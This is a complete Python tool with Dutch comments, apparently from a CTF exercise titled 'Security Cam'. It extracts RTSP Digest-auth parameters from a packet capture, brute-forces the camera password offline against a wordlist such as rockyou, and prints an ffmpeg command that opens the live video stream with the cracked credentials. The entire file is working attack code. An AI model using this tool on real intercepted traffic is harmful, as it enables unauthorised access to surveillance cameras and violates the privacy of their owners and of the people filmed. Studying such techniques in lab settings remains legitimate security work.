"""
rtsp_digest_crack.py - haal RTSP Digest-auth uit een pcap en kraak het wachtwoord.
GEEN externe libraries nodig (geen scapy/tshark): de Authorization-regel staat
als leesbare tekst in de capture, dus we lezen het bestand gewoon als bytes.

PATROON (Security Cam): onderschept cameraverkeer, RTSP met Digest-auth (MD5).
Je hebt nonce + response afgeluisterd -> kraak het wachtwoord OFFLINE met rockyou.

Digest-formule (MD5):
    HA1 = MD5(username:realm:wachtwoord)
    HA2 = MD5(methode:uri)
    response = MD5(HA1:nonce:HA2)                       # zonder qop
    response = MD5(HA1:nonce:nc:cnonce:qop:HA2)         # met qop=auth

GEBRUIK
  python3 rtsp_digest_crack.py <pcap> <wordlist>
"""
import sys, re, hashlib

def md5(s): return hashlib.md5(s.encode()).hexdigest()

RTSP_METHODS = r"OPTIONS|DESCRIBE|SETUP|PLAY|PAUSE|TEARDOWN|GET_PARAMETER|SET_PARAMETER|GET|POST"

def extract(path):
    blob = open(path, "rb").read().decode("latin1")
    # alle request-regels (methode + positie) en alle Authorization-regels
    methods = [(m.start(), m.group(1)) for m in
               re.finditer(r"(%s) \S+ (?:RTSP|HTTP)/1\.\d" % RTSP_METHODS, blob)]
    for am in re.finditer(r"Authorization: Digest ([^\r\n]+)", blob):
        fields = am.group(1)
        g = lambda k: (re.search(k + r'="?([^",\r\n]+)"?', fields) or [None, None])[1]
        if not g("response"):
            continue
        # methode = laatste request-regel vóór deze Authorization
        method = next((mm for pos, mm in reversed(methods) if pos < am.start()), None)
        return {
            "method": method, "username": g("username"), "realm": g("realm"),
            "nonce": g("nonce"), "uri": g("uri"), "response": g("response"),
            "qop": g("qop"), "nc": g("nc"), "cnonce": g("cnonce"),
        }
    return None

def crack(info, wordlist):
    HA2 = md5(f'{info["method"]}:{info["uri"]}')
    user, realm = info["username"], info["realm"]
    qop = info.get("qop")
    with open(wordlist, "rb") as f:
        for line in f:
            pw = line.rstrip(b"\r\n")
            try: pws = pw.decode()
            except: continue
            HA1 = md5(f"{user}:{realm}:{pws}")
            if qop:   # qop=auth variant
                resp = md5(f'{HA1}:{info["nonce"]}:{info["nc"]}:{info["cnonce"]}:{qop}:{HA2}')
            else:
                resp = md5(f'{HA1}:{info["nonce"]}:{HA2}')
            if resp == info["response"]:
                return pws
    return None
# python3 rtsp_digest_crack.py security-cam.pcapng rockyou.txt
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("gebruik: python3 rtsp_digest_crack.py <pcap> <wordlist>"); sys.exit(1)
    info = extract(sys.argv[1])
    if not info or not info["response"]:
        print("Geen RTSP/HTTP Digest-auth gevonden in de pcap."); sys.exit(1)
    print("Gevonden params:")
    for k, v in info.items():
        if v is not None: print(f"  {k:9}= {v}")
    pw = crack(info, sys.argv[2])
    print("\nWACHTWOORD:", pw if pw else "(niet in de woordenlijst)")
    if pw:
        print('\nLive kijken (poort = die uit de uri):')
        print(f'  ffmpeg -rtsp_transport tcp -i "rtsp://{info["username"]}:{pw}@'
              f'{info["uri"].split("://",1)[-1]}" -frames:v 30 live_%03d.png')